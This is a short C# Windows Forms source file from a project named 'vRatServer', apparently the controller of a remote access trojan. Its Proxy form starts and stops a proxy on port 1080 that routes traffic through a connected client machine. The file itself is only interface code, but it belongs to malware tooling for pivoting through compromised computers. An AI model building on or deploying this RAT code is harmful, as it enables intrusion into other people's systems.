using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Forms
{
    public partial class Proxy : Form
    {
        ProxyServer px=null;
        Client client;
        public Proxy(Client client)
        {
            this.client = client;
            InitializeComponent();

        }

        private void button1_Click(object sender, EventArgs e)
        {
            px = new ProxyServer(1080, richTextBox1, client);
            px.Start();
            button1.Enabled = false;
            button2.Enabled = true;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            button2.Enabled = false;
            button1.Enabled = true;
            px.Stop();
        }

        private void Proxy_Load(object sender, EventArgs e)
        {
            
        }

        private void Proxy_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (px != null)
            {
                px.Stop();
            }
        }
    }
}
